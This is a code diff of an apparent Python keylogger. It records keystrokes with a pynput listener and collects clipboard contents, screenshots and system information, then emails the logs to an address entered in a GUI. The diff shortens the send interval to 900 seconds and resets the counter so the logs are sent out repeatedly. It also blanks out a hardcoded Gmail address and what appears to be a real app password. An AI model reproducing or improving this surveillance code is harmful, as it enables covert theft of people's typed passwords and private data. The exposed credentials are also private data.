@@ -25,8 +25,8 @@ keys_information_e = "e_key_log.txt"
 system_information_e = "e_systeminfo.txt"
 clipboard_information_e = "e_clipboard.txt"
 
-email_address = "azureaditya5155@gmail.com" 
-password = "btzeuhkxhvzaleyx" 
+email_address = "" 
+password = "" 
 toAddr = ""
 
 state = 0
@@ -115,7 +115,7 @@ listener = Listener(on_press=on_press)
 
 def start_logger():
     global listener,toAddr
-    count = 1800
+    count = 900
     listener.start()
     while True:
         sleep(1)
@@ -129,12 +129,12 @@ def start_logger():
             screenshot()
             computer_information()
             send_email(keys_information,keys_information,toAddr)
+            count = 900
     listener.stop()
 
 def on_button_click():
     global state,toAddr,listener,stopFlag
     toAddr = receiver_entry.get()
-    print(toAddr)
     if state==0:
         state = 1
         print(state)
